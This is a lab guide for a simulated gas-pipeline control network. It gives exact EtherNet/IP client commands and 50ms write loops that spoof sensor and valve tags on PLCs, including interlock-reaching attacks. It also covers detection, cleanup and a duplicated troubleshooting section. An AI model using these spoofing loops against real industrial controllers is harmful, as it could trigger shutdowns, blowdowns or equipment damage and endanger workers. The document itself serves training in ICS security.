# Gas Pipeline Midstream — Attack Scenarios

> 6 attack scenarios targeting the gas-liquid separator system.
> Each attack includes: what it does, the exact commands, and the physical consequences.

---

## How the System Works (Quick Recap)

```
    Gas In ──[AV1]──→ SEPARATOR TANK ──[AV3]──→ Gas Out
                      │  PT301 (pressure)  │
                      │  LT201 (level)     │
                      └──[AV2]──[PUMP1]──→ Liquid Out
```

**Two data layers:**
- **SQLite** = physical reality (what PLCs read locally via `self.get()`)
- **ENIP servers** = network communications (what PLCs share with each other via `self.send()`/`self.receive()`)

**Attacks on ENIP** affect the network layer. PLC1 reads interlocks (LT201, PT301) **from the ENIP network** via `self.receive()`, so attacks on PLC2/PLC3 ENIP servers can inject data directly into PLC1's decision-making.

---

## ⚠️ Critical: Why a Single Write Won't Work (Read This First)

This is the most common mistake when starting out. You write a value and read it back — and it's already back to normal:

```bash
mininet> attacker python3 -m cpppo.server.enip.client --address 192.168.1.10 'PT101:1=250.0'
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'PT101:1'
             PT101:1              == [447.9]: 'OK'   ← your 250.0 is gone!
```

**Why?** Every **0.4 seconds**, PLC1 runs its control loop:

```
PLC1 loop:
  1. Read PT101 from SQLite     → gets real value (~447 kPa)
  2. Write PT101 to ENIP server → OVERWRITES your 250.0
  3. Sleep 0.4s
  4. Repeat...
```

Your single write gets overwritten before you can verify it.

### The Solution: Write Faster Than the PLC Cycle

PLCs update ENIP every **400ms**. You need to write every **50ms** to win the race:

```bash
# Run a background loop at 50ms intervals
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.10 'PT101:1=250.0'; sleep 0.05; done" &
```

The `&` sends it to the background. Now read it back and you'll see 250.0 held.

### Which Attacks Need a Loop? (Quick Reference)

| Attack | Needs Loop? | Why |
|--------|-------------|-----|
| Attack 1 — Spoof PT101 | ✅ Yes | PLC1 publishes PT101 every 400ms |
| Attack 2 — Spoof AV1 | ✅ Yes | PLC1 publishes AV1 every 400ms |
| Attack 3 — Spoof PUMP1 | ✅ Yes | PLC2 publishes PUMP1 every 400ms |
| Attack 4 — Combined AV1+AV3 | ✅ Yes | Both PLCs overwrite every 400ms |
| Attack 5 — Spoof LT201 | ✅ Yes | PLC2 publishes LT201 every 400ms |
| Attack 6 — Spoof PT301 | ✅ Yes | PLC3 publishes PT301 every 400ms |

> **Why is Attack 5 & 6 still interesting if they need a loop?**
> Because PLC1 **reads** LT201/PT301 from PLC2/PLC3 via `self.receive()`. Those spoofed values feed directly into PLC1's decision logic — not just the HMI display.

---

## Attack 1: Spoof Inlet Pressure (PT101 on PLC1)

### What You're Doing
Writing a fake low pressure value to PLC1's ENIP server continuously, making monitoring systems think the inlet pressure is low when it's actually high.

### Commands
```bash
# Step 1: Read real value first
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'PT101:1'

# Step 2: Start continuous spoof loop (50ms writes beat the PLC's 400ms cycle)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.10 'PT101:1=250.0'; sleep 0.05; done" &

# Step 3: Verify — should now hold at 250.0
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'PT101:1'

# Step 4: Watch the HMI dashboard — Inlet Pressure gauge should drop to 250 kPa
#         Bottom comparison table: Physical ~470 kPa vs Network 250 kPa  ← MISMATCH flagged!
```

### What You Should See
- **HMI Gauge**: Shows 250 kPa (danger amber colour)
- **Comparison table**: Physical = ~470 kPa | Network = 250.0 kPa → ⚠️ SPOOFED
- **🚨 ATTACK DETECTED** banner appears

### Effect
- **ENIP shows**: PT101 = 250 kPa (low)
- **Reality** (SQLite): PT101 = actual value (~470 kPa)
- **Who is fooled**: HMI operators, SCADA systems reading from PLC1's ENIP
- **Who is NOT fooled**: PLC1 itself (reads from SQLite)
- **Physical consequence**: Operators see low pressure and may manually open AV1, increasing actual pressure further

### Stop This Attack
```bash
# Kill the bash loop by its PID (find it with ps -ef | grep PT101)
mininet> attacker kill 26085   # replace 26085 with your actual PID

# OR — kill the bash loop directly (targets the 'while true' parent, not the python3 child)
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
An operator seeing falsely low inlet pressure might open valves further, causing actual overpressure — potentially leading to **pipe rupture or explosion**.

---

## Attack 2: Force Inlet Valve to Appear Open (AV1 on PLC1)

### What You're Doing
Continuously overwriting the AV1 tag on PLC1's ENIP server to show the valve as open — even when PLC1 has actually closed it.

### Commands
```bash
# Step 1: Check current state
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'

# Step 2: Start continuous loop — force AV1 to appear OPEN
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.10 'AV1:1=1'; sleep 0.05; done" &

# Step 3: Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'
```

### What You Should See
- **HMI Inlet Valve badge**: Shows OPEN (green) even when PLC1 closed it
- **Comparison table**: Physical = CLOSED | Network = OPEN → ⚠️ SPOOFED

### Effect
- **ENIP shows**: AV1 = 1 (open), even when PLC1 decided to close it
- **Who is fooled**: Any system reading valve state from ENIP
- **Physical consequence**: Operators think gas is flowing in when PLC1 actually closed the valve

### Stop This Attack
```bash
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
Masking the real valve state from operators could lead to wrong manual interventions. If operators think the inlet is already open but pipeline pressure is dropping, they may look for leaks that don't exist.

---

## Attack 3: Force Pump to Appear Off (PUMP1 on PLC2)

### What You're Doing
Continuously writing PUMP1=0 to PLC2's ENIP server, making monitoring systems think the pump is off when it is actually running.

### Commands
```bash
# Step 1: Check current pump state
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'PUMP1:2'

# Step 2: Start continuous loop — force pump to appear OFF
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.20 'PUMP1:2=0'; sleep 0.05; done" &

# Step 3: Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'PUMP1:2'
```

### What You Should See
- **HMI Pump Ejector badge**: Shows OFF even if liquid is high (pump should be running)
- **Comparison table**: Physical = ON | Network = OFF → ⚠️ SPOOFED

### Effect
- **ENIP shows**: PUMP1 = 0 (off)
- **Who is fooled**: HMI/SCADA monitoring systems
- **Physical consequence**: Operators think liquid is not being drained. They might try to start a backup pump or take unnecessary emergency actions

### Stop This Attack
```bash
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
If the pump-ejector appears to have failed, operators could dispatch emergency maintenance crews, shut down sections of the pipeline, or activate backup systems — all unnecessary and costly.

---

## Attack 4: Combined Attack — Overpressure Illusion (AV1 open + AV3 closed)

### What You're Doing
Simultaneously forcing ENIP to show the inlet valve as OPEN and the gas outlet valve as CLOSED — the most alarming state possible. It looks like gas is flowing in with no way out.

### Commands
```bash
# Combined continuous attack — two writes per loop iteration
mininet> attacker bash -c "while true; do \
  python3 -m cpppo.server.enip.client --address 192.168.1.10 'AV1:1=1'; \
  python3 -m cpppo.server.enip.client --address 192.168.1.30 'AV3:3=0'; \
  sleep 0.05; \
done" &

# Verify both
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.10 'AV1:1'
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'AV3:3'
```

### What You Should See
- **HMI**: Inlet Valve = OPEN, Gas Outlet = CLOSED (outlet shows 🚫)
- **Comparison table**: Multiple mismatches flagged
- **🚨 ATTACK DETECTED** with both AV1 and AV3 listed as affected tags

### Effect
- **ENIP shows**: AV1=1 (inlet open) + AV3=0 (outlet closed)
- **What operators see**: "Gas is flowing in and can't get out! EMERGENCY!"
- **Reality**: PLCs may have everything under control
- **Physical consequence**: Panic-driven manual overrides, emergency shutdowns

### Stop This Attack
```bash
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
This attack would trigger **emergency depressurization procedures**. In a real gas pipeline, an operator seeing this would likely:
1. Hit the emergency shutdown (ESD) button
2. Initiate pipeline blowdown (venting gas to atmosphere)
3. Evacuate personnel

All of this causes massive operational losses and potential environmental damage — exactly what the attacker wants.

---

## Attack 5: Spoof Tank Level (LT201 on PLC2) — Interlock Attack ⚡

### ⚠️ This Attack Actually Reaches PLC1's Brain

### What You're Doing
Spoofing the tank level reading on PLC2's ENIP server. Because PLC1 reads LT201 from PLC2 via `self.receive()`, the fake value is injected **directly into PLC1's interlock logic** — not just the HMI display.

### Why the Loop Still Matters Here
PLC2 publishes the real LT201 every 400ms. Your loop at 50ms ensures the spoofed value wins the race and is the value PLC1 reads on its next `self.receive()` call.

### Commands
```bash
# Step 1: Read real tank level
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'LT201:2'

# Step 2: Spoof to HIGH level (above H threshold of 1.0m)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.20 'LT201:2=1.2'; sleep 0.05; done" &

# Step 3: Verify spoof is holding
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.20 'LT201:2'

# Step 4: Check PLC1 received the spoofed value in its log
mininet> plc1 tail -5 logs/plc1.log
# Look for: DEBUG PLC1 - receive lt201: 1.200 m
```

### What You Should See
- **HMI comparison table**: Physical LT201 = real | Network LT201 = 1.2m → ⚠️ SPOOFED
- **PLC1 log**: `receive lt201: 1.200 m` — PLC1 is being fed the fake value

### Effect (Current Code — Interlock Disabled)
- **PLC1 receives**: LT201 = 1.2m (spoofed!)
- **PLC1 logs it** and stores it on its own ENIP server
- **No control action taken** because interlock code is commented out

### Effect (With Interlock Enabled in plc1.py)
If you uncomment the interlock logic in `plc1.py`:
- **PLC1 receives spoofed LT201 = 1.2m** (above H threshold)
- **PLC1 closes AV1** (inlet valve) to protect the separator
- **Gas stops flowing in** → inlet pressure builds up
- **Tank level actually drops** (still being drained)
- **Result**: Unnecessary shutdown of gas supply

### Stop This Attack
```bash
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
Spoofing tank level high could cause:
- Unnecessary inlet valve closure → gas supply disruption
- Pump-ejector running against an empty tank → **pump cavitation and damage**
- Production loss from pipeline shutdown

---

## Attack 6: Spoof Tank Pressure (PT301 on PLC3) — Interlock Attack ⚡

### ⚠️ This Attack Also Reaches PLC1's Brain

### What You're Doing
Spoofing the tank pressure on PLC3's ENIP server. PLC1 reads PT301 from PLC3 via `self.receive()` — feeding the false value into PLC1's safety decisions.

### Commands
```bash
# Step 1: Read real tank pressure
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'PT301:3'

# Step 2: Spoof to HIGH pressure (above H threshold of 600 kPa)
mininet> attacker bash -c "while true; do python3 -m cpppo.server.enip.client --address 192.168.1.30 'PT301:3=700.0'; sleep 0.05; done" &

# Step 3: Verify
mininet> attacker python3 -m cpppo.server.enip.client --print --address 192.168.1.30 'PT301:3'

# Step 4: Check PLC1 received the spoofed value
mininet> plc1 tail -5 logs/plc1.log
# Look for: DEBUG PLC1 - receive pt301: 700.00 kPa
```

### What You Should See
- **HMI comparison table**: Physical PT301 = real | Network PT301 = 700 kPa → ⚠️ SPOOFED
- **PLC1 log**: `receive pt301: 700.00 kPa` — PLC1 is being fed the fake value

### Effect (Current Code — Interlock Disabled)
- **PLC1 receives**: PT301 = 700 kPa (spoofed!)
- **PLC1 logs it** — no control action taken

### Effect (With Interlock Enabled in plc1.py)
- **PLC1 receives spoofed PT301 = 700 kPa** (above H threshold)
- **PLC1 closes AV1** to stop gas flowing into an "overpressurized" tank
- **Gas supply cut off** → production loss

### Stop This Attack
```bash
mininet> attacker bash -c "pkill -f 'while true'"
```

### In Real Life
Spoofing tank pressure high could cause:
- Emergency inlet closure → gas supply disruption
- Emergency depressurization/blowdown procedures triggered
- In a worst case: if operators override based on false data and actually vent the gas, it could cause **environmental contamination** and fire risk

---

## Enabling Interlocks for Full Attack Impact

To make Attacks 5 & 6 cause actual physical consequences, uncomment the interlock logic in `plc1.py`:

**Find these lines (near the end of the main_loop):**
```python
            #if lt201 >= LT201_THRESH['H'] or pt301 >= PT301_THRESH['H']:
            #    # CLOSE AV1 — tank is too full or pressurized
            #    self.set(AV1, 0)
            #    print("INFO PLC1 - interlock: lt201 or pt301 over H -> close AV1.")
```

**Remove the `#` to enable:**
```python
            if lt201 >= LT201_THRESH['H'] or pt301 >= PT301_THRESH['H']:
                # CLOSE AV1 — tank is too full or pressurized
                self.set(AV1, 0)
                print("INFO PLC1 - interlock: lt201 or pt301 over H -> close AV1.")
```

Then reset and restart:
```bash
rm gas_pipeline_db.sqlite
sudo python3 init.py
sudo python3 run.py
```

---

## Summary Table

| # | Attack | Target | ENIP Tag | Spoofed Value | Loop Needed? | Reaches PLC1? | Physical Impact |
|---|--------|--------|----------|---------------|--------------|---------------|-----------------|
| 1 | Spoof Inlet Pressure | PLC1 (.10) | `PT101:1` | 250.0 | ✅ 50ms loop | No (reads SQLite) | Blinds HMI monitoring |
| 2 | Force Inlet Valve Open | PLC1 (.10) | `AV1:1` | 1 | ✅ 50ms loop | No (reads SQLite) | Blinds HMI monitoring |
| 3 | Force Pump Off | PLC2 (.20) | `PUMP1:2` | 0 | ✅ 50ms loop | No (PLC2 reads SQLite) | Blinds HMI monitoring |
| 4 | Combined (AV1+AV3) | PLC1+PLC3 | Both | 1, 0 | ✅ 50ms loop | No | Max deception, panic |
| 5 | **Spoof Tank Level** | PLC2 (.20) | `LT201:2` | 1.2 | ✅ 50ms loop | **YES** (via receive) | If interlock on: AV1 closes |
| 6 | **Spoof Tank Pressure** | PLC3 (.30) | `PT301:3` | 700.0 | ✅ 50ms loop | **YES** (via receive) | If interlock on: AV1 closes |

---

## Stopping Background Attack Loops

### The Correct Way
```bash
# Best — kills the bash 'while true' parent (not just the python3 child)
mininet> attacker bash -c "pkill -f 'while true'"
```

### If That Doesn't Work — Find the PID Manually
```bash
# Look for 'bash -c while true' in the list — that is your loop
mininet> attacker ps -ef | grep "while true"
mininet> attacker kill <PID>
```

### ☠️ CRITICAL: How to Read `ps` Output Safely

When you run `ps -ef | grep <tag>`, you will see TWO types of processes. **You must only kill the CLIENT, never the SERVER:**

```
# ✅ SAFE TO KILL — this is YOUR attack loop
root  26085  bash -c while true; do python3 -m cpppo.server.enip.CLIENT ...
                                                                  ^^^^^^ CLIENT

# ❌ NEVER KILL — this is PLC1's ENIP server (killing it crashes the simulation)
root  5577   python3 -m cpppo.server.enip --address 192.168.1.10:44818 PT101:1=REAL ...
                                   ^^^^^^ no "client" — this IS the server
```

**The tell:** server processes have `cpppo.server.enip` followed by `--address` and tag definitions like `PT101:1=REAL`. Client processes have `cpppo.server.enip.client` and a specific value like `PT101:1=250.0`.

### If You Accidentally Kill a PLC Server

The simulation is broken and cannot be recovered in-place. You must restart:

```bash
mininet> exit
sudo mn -c
sudo python3 run.py
```

---

## Troubleshooting

### "I wrote a value but it went back to normal immediately"
This is the PLC overwriting you. Use a continuous loop with `sleep 0.05` instead of a single write. See the **Critical** section at the top of this document.

### "The loop is running but the value still jumps around"
The PLC and your loop are racing. Try reducing sleep to `0.02` (20ms) to write even faster.

### "My attack loop is running but the HMI doesn't show a mismatch"
Check if the dashboard is still in its 15-second warm-up period (header shows "Warming up..."). Wait for it to say "Online — polling" before expecting attack alerts.

### "How do I check if my loop is still running?"
```bash
mininet> attacker ps -ef | grep "while true"
```

### "kill %1 doesn't work"
In Mininet, each `attacker bash -c "..."` runs in a new shell, so `%1` from a previous shell is invisible. Use `pkill -f 'while true'` or find the PID with `ps -ef` instead.

### "I got Connection refused on PLC1"
You killed PLC1's ENIP server by mistake. There is no recovery — restart the simulation:
```bash
mininet> exit
sudo mn -c
sudo python3 run.py
```

---

## Troubleshooting

### "I wrote a value but it went back to normal immediately"
This is the PLC overwriting you. Use a continuous loop with `sleep 0.05` instead of a single write. See the **Critical** section at the top of this document.

### "The loop is running but the value still jumps around"
The PLC and your loop are racing. Try reducing sleep to `0.02` (20ms) to write even faster.

### "My attack loop is running but the HMI doesn't show a mismatch"
Check if the dashboard is still in its 15-second warm-up period (header shows "Warming up..."). Wait for it to say "Online — polling" before expecting attack alerts.

### "How do I check if my loop is still running?"
```bash
mininet> attacker bash -c "jobs"
```
